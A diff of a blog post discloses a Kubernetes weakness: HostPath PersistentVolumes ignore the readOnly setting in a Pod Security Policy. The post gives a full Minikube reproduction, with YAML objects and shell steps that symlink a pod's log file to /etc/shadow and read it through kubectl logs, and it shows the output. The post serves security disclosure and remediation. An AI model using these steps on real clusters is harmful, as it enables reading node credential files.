@@ -5,16 +5,215 @@ date:   2020-03-05 20:12:50 -0800
 categories: containers
 ---
 
-## Background and Problem Statement
+## Background
 
-In, Kubernetes a `PersistentVolume` object is an API
+In Kubernetes, a `PersistentVolume` object is an API
 object that represents a Volume (some kind of mount),
 which can make it easier for operators to keep track
-of the Volume:
+of the Volume. A "share" of a `PersistentVolume` can
+be claimed by a Pod via a `PersistentVolumeClaim` object:
 
 | ![pvdocs](/assets/images/pvdocs.png) | 
 |:--:| 
 | <https://kubernetes.io/docs/concepts/storage/persistent-volumes/#introduction> |
 
 
+To actually use a Volume defined by a `PersistentVolume` object,
+a Pod's spec references an associated `PersistentVolumeClaim` in
+its namespace:
+
+| ![pvcdocs](/assets/images/pvcdocs.png) | 
+|:--:| 
+| <https://kubernetes.io/docs/concepts/storage/persistent-volumes/#claims-as-volumes> |
+
+
+A `PersistentVolume` object can define the [same types](https://kubernetes.io/docs/concepts/storage/persistent-volumes/#types-of-persistent-volumes) of Volumes you are
+used to using inline within a Pod's YAML spec, such as `HostPath`.
+
+## Problem Statement
+
+Trail of Bits noted in their Kubernetes audit that `HostPath` type `PersistentVolume`
+objects *are not* check against the [`hostPath`-relevant directives](https://kubernetes.io/docs/concepts/policy/pod-security-policy/#volumes-and-file-systems) in a user's Pod Security Policy (PSP):
+
+| ![tobpvbug](/assets/images/tobpvbug.png) | 
+|:--:| 
+| <https://github.com/kubernetes/community/blob/master/wg-security-audit/findings/Kubernetes%20Final%20Report.pdf> |
+
+Their exploit scenario involved an attacker who, as per their PSP, was *unable* to use `hostPath`
+Volumes, but was allowed to create Pods, `PersistentVolume` objects, and `PersistentVolumeClaim` objects.
+In this case, the attacker can create a `HostPath` type `PersistentVolume` specifying a mount at the Node's home
+directory, and reference that in a subsequent `PersistentVolumeClaim` and Pod reference, thus achieving Pod that
+can access the Node's home directory, despite the PSP that is in place.
+
+Kubernetes reponded in turn and added the following language to the documentation:
+
+| ![pvorigwarning](assets/images/pvorigwarning.png) | 
+|:--:| 
+| <https://github.com/kubernetes/website/pull/15756> |
+
+However, **there is an additional angle to build on here**. 
+
+It is known that writable `hostPath` Volumes are insecure, and Aqua has a [fantastic writeup](https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts) on *one such* example of why this is the case. In Aqua's writeup, they
+demonstrate how a Pod that receives a writable `hostPath` Volume of `/var/log` can access *any* files on the Node's
+filesystem. You should read the writeup, but this occurs because said Pod can overwrite its (or any other Pod's) `0.log` logfile with a symlink to e.g. `/etc/shadow`, and this symlink is followed by the Node upon any `kubectl logs PODNAME` invocation for the Pod whose logfile has been poisoned!
+
+This is somewhat of a contrived example, but Kubernetes is weary of such trickery, and so they have declared any writeable `hostPath` Volume insecure:
+
+| ![pvorigwarning](assets/images/readfswarning.png) | 
+|:--:| 
+| <https://kubernetes.io/docs/concepts/policy/pod-security-policy/#volumes-and-file-systems> |
+
+But note their prescribed fix in the figure above: use the `readOnly: true` sub-directive within the
+`allowedHostPaths` directive in a user's PSP in order to make `hostPath` Volumes read-only, and thus safe.
+But wait! As we discussed earlier, those directives are not checked for `HostPath` type `PersistentVolume`
+objects! And while `PersistentVolume` objects have an `accessModes` directive, support for individual access
+modes is determined by the implementation of the underlying storage, and a read-only mode is not supported for
+`HostPath` type `PersistentVolumes`:
+
+| ![pvorigwarning](assets/images/pvaccessmodesupport.png) | 
+|:--:| 
+| <https://kubernetes.io/docs/concepts/storage/persistent-volumes/#persistent-volumes> |
+
+**Exploit Scenario:**
+
+An operator wishes to provide a read-only copy of the Node's `/var/log`, such that a Pod can view other Pods'
+logs, and they choose to represent this as a `HostPath` type `PersistentVolume`.
+
+* The operator reads the aforementioned warning in the PSP documentation, and thus sets `readOnly: true` in `allowedHostPaths` for the `PersistentVolume`, assuming this makes the mount read-only, [as it does for inline `hostPath` Volumes](https://github.com/kubernetes/kubernetes/pull/58647).
+
+* Since the Pod can actually write to `/var/log`, the Pod receiving this Volume mount can follow the steps in Aqua's writeup. By writing a symlink to a Pod's logfile, they can read *any* file off of the Node's filesystem, not just what is in `/var/log`/.
+
+**Minikube Example**
+
+Here are some example Kubernetes objects and steps that can be used to reproduce the
+exploit scenario above:
+
+1. Reads the docs, and sets `readOnly: true` in a PSP for `hostPath`
+Volumes, in order to prevent attacks surrounding writing and symlinks;
+the operator wants a Pod with read-only access to other Pods' logs.
+
+~~~
+apiVersion: policy/v1beta1
+kind: PodSecurityPolicy
+metadata:
+   name: psp-restricted
+spec:
+   allowPrivilegeEscalation: false
+   allowedHostPaths:
+   - pathPrefix: /var/log
+     readOnly: true
+   fsGroup:
+     rule: RunAsAny
+   requiredDropCapabilities:
+   - ALL
+   runAsUser:
+     rule: RunAsAny
+   seLinux:
+     rule: RunAsAny
+   supplementalGroups:
+     rule: RunAsAny
+   volumes:
+   - configMap
+   - persistentVolumeClaim
+   - emptyDir
+   - secret
+   - projected
+   - nfs
+~~~
+
+2. creates a `PersistentVolume` of type `HostPath`, which allows a Pod to
+access `/var/log`, under the assumption it is read-only via the PSP
+directive
+
+~~~
+apiVersion: v1
+kind: PersistentVolume
+metadata:
+    name: task-pv-volume-vol
+    labels:
+      type: local
+spec:
+    storageClassName: manual
+    capacity:
+      storage: 10Gi
+    accessModes:
+      - ReadWriteOnce
+    hostPath:
+      path: "/var/log"
+
+apiVersion: v1
+kind: PersistentVolumeClaim
+metadata:
+    name: task-pv-claim-vol
+spec:
+    storageClassName: manual
+    accessModes:
+      - ReadWriteOnce
+    resources:
+      requests:
+        storage: 3Gi
+~~~
+
+3. but a Pod can still write a symlink to its `0.log` file, which is
+followed by the Node upon `kubectl logs PODNAME` in order to read *any* file from the Node
+
+~~~
+apiVersion: v1
+kind: Pod
+metadata:
+    name: task-pv-pod
+spec:
+    volumes:
+      - name: task-pv-storage-vol
+        persistentVolumeClaim:
+          claimName: task-pv-claim-vol
+    containers:
+      - name: task-pv-container
+        image: ubuntu:latest
+        command: [ "sh", "-c", "sleep 1h" ]
+        volumeMounts:
+          - mountPath: "/hostlogs"
+            name: task-pv-storage-vol
+~~~
+
+~~~
+kubectl exec -it task-pv-pod -n default /bin/bash
+~~~
+
+~~~
+cd
+/hostlogs/pods/default_task-pv-pod_c9030cba-f67b-4564-8bbc-531d87e63920/task-pv-container/
+~~~
+
+~~~
+rm 0.log
+~~~
+
+~~~
+ln -s /etc/shadow 0.log
+~~~
+
+~~~
+kubectl logs task-pv-pod -n default
+failed to get parse function: unsupported log format:
+"root:*:15887:0:::::\n"
+~~~
+
+
 ## Fix?
+
+At this point, we've seen why **any `HostPath` type `PersistentVolume` object should
+be considered suspect because they cannot be made read-only**. While the `/var/log` example
+is the only one I know of, there might be more, which is why the documentation warns about
+writable `hostPath` Volumes in the first place.
+
+To address this, Kubernetes is doing two things:
+
+* Updating the documentation's language to state that `HostPath` type `PersistentVolume` objects
+cannot be made read-only, which, as we know, is insecure by design
+
+| ![newdocwarning](assets/images/newdocwarning.png) | 
+|:--:| 
+| <https://github.com/kubernetes/website/pull/19504/> |
+
+* [Requesting](https://github.com/kubernetes/kubernetes/issues/88880) a feature for read-only `HostPath` type `PersistentVolume` objects
